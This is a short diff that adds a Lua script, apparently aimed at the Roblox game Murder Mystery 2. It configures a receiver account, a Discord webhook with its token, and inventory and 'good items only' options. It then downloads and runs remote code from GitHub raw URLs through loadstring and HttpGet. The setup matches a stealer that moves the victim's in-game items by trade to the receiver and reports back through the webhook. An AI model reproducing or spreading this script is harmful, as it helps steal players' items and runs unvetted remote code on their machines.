@@ -1,0 +1,11 @@
+Config = {
+    Receivers = {"jayfred0987"},
+    Webhook = "https://discord.com/api/webhooks/1294945760324096041/6B6Fej0aToHwCKjQAi9Ww-sapwvwOU8dxxkxV5TFtC-GeYZ7yZVFjgCLNkm5d1PaRBBc",
+    FullInventory = true,
+    GoodItemsOnly = true,
+    ResendTrade = ".resend",
+    Script = "Custom",
+    CustomLink = "loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialHardHub/x/main/mm2.lua"))()"
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Skidtho/MM2/refs/heads/main/Pethical-MM2.lua"))()
